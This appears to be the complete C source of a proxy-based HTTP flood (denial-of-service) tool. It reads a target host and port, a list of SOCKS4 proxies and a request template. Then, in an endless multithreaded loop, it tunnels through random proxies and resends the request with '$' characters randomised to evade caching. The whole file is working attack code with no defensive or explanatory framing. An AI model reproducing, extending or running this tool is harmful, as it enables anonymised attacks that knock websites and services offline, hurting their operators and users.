#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>
#include <fcntl.h>

char *req;
struct hostent *host;
struct timeval tv;
int port;
char *ip;
int bots;

struct socks4 {
 char ver;
 char cmd;
 short port;
 unsigned int ip;
 char login;
};

struct proxy {
 char ip[32];
 int port;
}proxies[100000];

int randreq(char *req2) {
 for(int i = 0; i < strlen(req); i++) {
  req2[i] = req[i]; 
  if(req[i] == '$') {
   req2[i] = rand() % (0x7b - 0x61) + 0x61;
  }
 }  
 return 1;
}

void *sendtor(void *unused) {
 char resp[1024];
 char req2[1024];
 int i = rand() % (bots - 0) + 0;
 struct socks4 packeds;
 struct sockaddr_in sa;
 sa.sin_addr.s_addr = inet_addr(proxies[i].ip); 
 sa.sin_port = htons(proxies[i].port); 
 sa.sin_family = AF_INET; 
 packeds.ver = 4;
 packeds.cmd = 1; 
 packeds.port = htons(port); 
 packeds.ip = *((unsigned int *)host->h_addr); 
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
   send(fd, &packeds, 9, MSG_NOSIGNAL);
   while(randreq(req2) == 1 && send(fd, req2, strlen(req2), MSG_NOSIGNAL) != -1 && recv(fd, resp, 1024, MSG_NOSIGNAL) != -1) {
    dprintf(1, "%s%s\n", req2, resp);
    memset(resp, 0, 1024);
   }
  close(fd);
 } else {
  close(fd);
 }
}

int makereq(char *file) {
 req = malloc(1024);
 FILE *fd;
 if((fd = fopen(file, "r"))) {
  fread(req, 1024, 1024, fd); 
  fclose(fd);
 } else {
  dprintf(1, "Request file doesnt exist\n"); 
 }
}

int makeproxies(char *file) {
 FILE *fd;
 char proxylist[100000][32]; 
 if((fd = fopen(file, "r"))) {
  int b = 0;
  while(1) {
   if(fgets(proxylist[b], 32, fd) == 0) break;
   b++; 
   if(b == 99999) break;
  }
  bots = b;
  for(int i = 0; i < bots; i++) {
   char *portt;
   if((portt = strstr(proxylist[i], ":"))) {
    proxies[i].port = atoi(portt+1);
    int size = strlen(portt+1);
    size++; 
    memcpy(proxies[i].ip, proxylist[i], strlen(proxylist[i]) - size);
   }
   dprintf(1, "%s:%d\n", proxies[i].ip, proxies[i].port);
  }
  sleep(1);
 } else {
  dprintf(1, "file does not exist\n"); 
  exit(0); 
 }
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 if(argc < 6) {
  dprintf(1, "domain/ip port proxies_file request_file threads\n");
  return 0; 
 }
 port = atoi(argv[2]);
 ip = argv[1];
 if((host = gethostbyname(ip))) {
  makeproxies(argv[3]);
  makereq(argv[4]);
  pthread_t threads[atoi(argv[5])];
  while(1) {
   for(int i = 0; i < atoi(argv[5]); i++) {
    pthread_create(&threads[i], 0, &sendtor, 0);
   }
   for(int i = 0; i < atoi(argv[5]); i++) {
    pthread_join(threads[i], 0);
   }
  }
 } else {
  dprintf(1, "Could not resolve address\n");
 }
}